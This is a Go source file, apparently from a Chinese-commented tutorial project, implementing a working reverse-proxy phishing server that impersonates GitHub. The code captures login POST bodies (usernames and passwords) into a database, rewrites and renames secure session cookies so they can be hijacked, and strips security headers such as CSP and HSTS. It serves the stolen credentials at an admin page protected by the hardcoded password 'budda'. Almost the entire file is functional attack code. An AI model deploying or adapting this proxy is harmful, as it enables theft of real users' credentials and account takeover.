package main

import (
	"bytes"
	"flag"
	"fmt"
	"go-phishing/db"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"strings"
)

// var upstreamURL = "https://about.gitlab.com"

// var upstreamURL = "https://gitlab.com"

const upstreamURL = "https://github.com"

var (
	phishURL string
	port     string
)

func replaceURLInResp(body []byte, header http.Header) []byte {
	// detect is html or not
	contentType := header.Get("Content-Type")
	isHTML := strings.Contains(contentType, "text/html")
	// if NOT, return same body
	if !isHTML {
		return body
	}
	bodyStr := string(body)
	bodyStr = strings.Replace(bodyStr, upstreamURL, phishURL, -1)

	phishGitURL := fmt.Sprintf(`%s(.*)\.git`, phishURL)
	upstreamGitURL := fmt.Sprintf(`%s$1.git`, upstreamURL)
	re, err := regexp.Compile(phishGitURL)
	if err != nil {
		panic(err)
	}
	bodyStr = re.ReplaceAllString(bodyStr, upstreamGitURL)
	return []byte(bodyStr)
}

func cloneRequest(r *http.Request) *http.Request {
	// 取得原請求的 method、body
	method := r.Method
	// 把 body 讀出來轉成 string
	bodyByte, _ := ioutil.ReadAll(r.Body)
	bodyStr := string(bodyByte)

	// if r.URL.String() == "/users/sign_in" && method == "GET" {
	// 	upstreamURL = "https://gitlab.com"
	// } else {
	// 	upstreamURL = "https://about.gitlab.com"
	// }
	if r.URL.String() == "/users/sign_in" && method == "POST" {
		db.Insert(bodyStr)
	}
	// 如果是 POST 到 /session 的請求
	// 就把 body 存進資料庫內（帳號密碼 GET !!）
	if r.URL.String() == "/session" && r.Method == "POST" {
		db.Insert(bodyStr)
	}
	body := bytes.NewReader(bodyByte)

	// 取得原請求的 url，把它的域名替換成真正的 Github
	path := r.URL.Path
	rawQuery := r.URL.RawQuery
	url := upstreamURL + path + "?" + rawQuery
	// 建立新的 http.Request
	req, err := http.NewRequest(method, url, body)
	if err != nil {
		panic(err)
	}
	req.Header = r.Header
	origin := strings.Replace(r.Header.Get("Origin"), phishURL, upstreamURL, -1)
	referer := strings.Replace(r.Header.Get("Referer"), phishURL, upstreamURL, -1)
	req.Header.Del("Accept-Encoding")

	req.Header.Set("Origin", origin)
	req.Header.Set("Referer", referer)
	for i, value := range req.Header["Cookie"] {
		newValue := strings.Replace(value, "XXHost", "__Host", -1)
		newValue = strings.Replace(newValue, "XXSecure", "__Secure", -1)
		req.Header["Cookie"][i] = newValue
	}

	return req
}

func sendReqToUpstream(req *http.Request) ([]byte, http.Header, int) {
	checkRedirect := func(r *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}
	// 建立 http client
	client := http.Client{CheckRedirect: checkRedirect}

	// client.Do(req) 會發出請求到 Github、得到回覆 resp
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}

	// 把回覆的 body 從 Reader（串流）轉成 []byte
	respBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	resp.Body.Close()

	// 回傳 body
	return respBody, resp.Header, resp.StatusCode
}
func adminHandler(w http.ResponseWriter, r *http.Request) {
	username, password, ok := r.BasicAuth()
	if username == "budda" && password == "budda" && ok {
		strs := db.SelectAll()
		w.Write([]byte(strings.Join(strs, "\n\n")))
	} else {
		w.Header().Add("WWW-Authenticate", "Basic")
		w.WriteHeader(401)
		w.Write([]byte("不給你看勒"))
	}
}

func handler(w http.ResponseWriter, r *http.Request) {
	req := cloneRequest(r)

	// 取得 header
	body, header, statusCode := sendReqToUpstream(req)
	body = replaceURLInResp(body, header)

	// 用 range 把 header 中的 Set-Cookie 欄位全部複製給瀏覽器的 header
	for _, v := range header["Set-Cookie"] {
		// 把 domain=.github.com 移除
		newValue := strings.Replace(v, "domain=.github.com;", "", -1)
		// newValue := strings.Replace(v, "domain=.gitlab.com;", "", -1)
		// 把 secure 移除
		newValue = strings.Replace(newValue, "secure;", "", 1)
		// 幫 cookie 改名
		// __Host-user-session -> XXHost-user-session
		// __Secure-cookie-name -> XXSecure-cookie-name
		newValue = strings.Replace(newValue, "__Host", "XXHost", -1)
		newValue = strings.Replace(newValue, "__Secure", "XXSecure", -1)

		w.Header().Add("Set-Cookie", newValue)

	}
	for k := range header {
		if k != "Set-Cookie" {
			value := header.Get(k)
			w.Header().Set(k, value)
		}
	}
	w.Header().Del("Content-Security-Policy")
	w.Header().Del("Strict-Transport-Security")
	w.Header().Del("X-Frame-Options")
	w.Header().Del("X-Xss-Protection")
	w.Header().Del("X-Pjax-Version")
	w.Header().Del("X-Pjax-Url")

	// 如果 status code 是 3XX 就取代 Location 網址
	if statusCode >= 300 && statusCode < 400 {
		location := header.Get("Location")
		newLocation := strings.Replace(location, upstreamURL, phishURL, -1)

		w.Header().Set("Location", newLocation)
	}

	// 轉傳正確的 status code 給瀏覽器
	w.WriteHeader(statusCode)
	w.Write(body)
}

func main() {
	// 把 --phishURL=... 的值存進變數 phishURL 裡面
	// 預設值是 "http://localhost:8080"
	// "部署在哪個網域" 是這個參數的說明，自己看得懂就可以了
	flag.StringVar(&phishURL, "phishURL", "http://localhost:8080", "部署在哪個網域")
	// 把 --port=... 的值存進變數 port 裡面
	// 預設值是 ":8080"
	flag.StringVar(&port, "port", "8080", "部署在哪個 port")
	flag.Parse()
	if p, ok := os.LookupEnv("PORT"); ok {
		port = p
	}
	db.Connect()
	http.HandleFunc("/phish-admin", adminHandler)
	http.HandleFunc("/", handler)
	err := http.ListenAndServe(":"+port, nil)
	if err != nil {
		panic(err)
	}
}
